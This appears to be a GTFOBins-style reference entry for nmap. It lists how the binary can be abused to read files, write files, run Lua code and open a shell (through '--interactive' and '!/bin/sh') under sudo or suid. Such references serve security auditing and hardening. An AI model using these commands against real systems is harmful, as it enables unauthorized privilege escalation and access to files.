---
type: gtfobin
name: nmap
platform: Unix
functions: [file-read, file-write, inherit, shell]
tags: [gtfobin, unix, lotl]
---

# nmap

## file-read

```bash
nmap -iL /path/to/input-file
```
_The file is actually parsed as a list of hosts/networks, lines are leaked through error messages._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
nmap -oG=/path/to/output-file DATA
```
_The payload appears inside the regular nmap output._
**Contexts:** sudo, suid, unprivileged

## inherit

```bash
echo '...' >/path/to/temp-file
nmap --script=/path/to/temp-file
```
_This allows to run Lua code (`...`)._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
nmap --interactive
!/bin/sh
```
**Contexts:** sudo, suid, unprivileged
